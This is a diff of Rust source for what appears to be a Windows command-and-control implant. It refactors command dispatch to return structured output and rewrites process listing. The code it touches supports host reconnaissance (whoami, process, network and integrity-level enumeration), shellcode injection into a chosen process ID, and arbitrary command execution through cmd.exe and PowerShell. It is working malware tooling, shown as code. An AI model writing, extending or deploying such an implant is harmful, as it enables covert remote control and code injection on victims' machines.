@@ -58,22 +58,24 @@ fn get_integrity_level_int() -> u8 {
 
 // ── Command dispatch ─────────────────────────────────────────────────────────
 
-fn dispatch(command: &str, parameters: &str) -> String {
+fn dispatch(command: &str, parameters: &str) -> link_common::CommandOutput {
     if let Some(output) = dispatch_common(command, parameters) {
         return output;
     }
 
     match command {
-        "whoami" => format!("{}\\{}", hostname(), username()),
-        "info" => collect_system_info(),
-        "ps" => list_processes(),
-        "netstat" => list_network_connections(),
-        "integrity" => integrity_level(),
+        "whoami" => format!("{}\\{}", hostname(), username()).into(),
+        "info" => collect_system_info().into(),
+        "ps" => list_processes_browser(),
+        "netstat" => list_network_connections().into(),
+        "integrity" => integrity_level().into(),
         "inject" => {
             let pid = link_common::extract_param(parameters, "pid");
             let sc = link_common::extract_param(parameters, "shellcode");
-            inject_cmd(&format!("{} {}", pid, sc))
+            inject_cmd(&format!("{} {}", pid, sc)).into()
         }
+        // cmd and powershell are Windows-specific shell variants;
+        // the Go side registers only "shell" — these are handled here for compat.
         "cmd" | "powershell" | "shell" => {
             let cmd = link_common::extract_param(parameters, "command");
             let cmd_str = if cmd.is_empty() { parameters } else { &cmd };
@@ -85,6 +87,7 @@ fn dispatch(command: &str, parameters: &str) -> String {
             } else {
                 shell_exec("cmd.exe", &["/C", cmd_str])
             }
+            .into()
         }
         _ => {
             let cmd = link_common::extract_param(parameters, "command");
@@ -92,6 +95,7 @@ fn dispatch(command: &str, parameters: &str) -> String {
                 "cmd.exe",
                 &["/C", if cmd.is_empty() { parameters } else { &cmd }],
             )
+            .into()
         }
     }
 }
@@ -180,21 +184,48 @@ fn collect_system_info() -> String {
     info.join("\n")
 }
 
-fn list_processes() -> String {
-    let output = match silent_command("tasklist", &["/FO", "CSV", "/NH"]).output() {
+fn list_processes_browser() -> link_common::CommandOutput {
+    let output = match silent_command("tasklist", &["/FO", "CSV", "/V", "/NH"]).output() {
         Ok(o) => o,
-        Err(e) => return format!("[-] Failed to execute tasklist: {}", e),
+        Err(e) => return format!("[-] Failed to execute tasklist: {}", e).into(),
     };
 
     if !output.status.success() {
-        return "[-] tasklist command failed".to_string();
+        return "[-] tasklist command failed".to_string().into();
     }
 
     let output_str = String::from_utf8_lossy(&output.stdout);
-    format!(
-        "Name\tPID\tSession\tSession#\tMem Usage\n{}",
-        output_str.replace(',', "\t")
-    )
+    let mut text_lines = Vec::new();
+    let mut entries = Vec::new();
+    text_lines.push("Name\tPID\tSession\tSession#\tMem Usage".to_string());
+
+    for line in output_str.lines() {
+        if line.trim().is_empty() {
+            continue;
+        }
+        let fields: Vec<&str> = line.split(',').map(|f| f.trim_matches('"')).collect();
+        if fields.len() < 2 {
+            continue;
+        }
+        let name = fields[0].to_string();
+        let pid: u32 = fields[1].parse().unwrap_or(0);
+        text_lines.push(line.replace(',', "\t"));
+        entries.push(link_common::ProcessEntry {
+            process_id: pid,
+            name,
+            parent_process_id: 0,
+            user: fields.get(6).map(|s| s.to_string()),
+            command_line: None,
+            bin_path: None,
+            architecture: None,
+        });
+    }
+
+    link_common::CommandOutput {
+        text: text_lines.join("\n"),
+        processes: Some(entries),
+        file_browser: None,
+    }
 }
 
 fn list_network_connections() -> String {
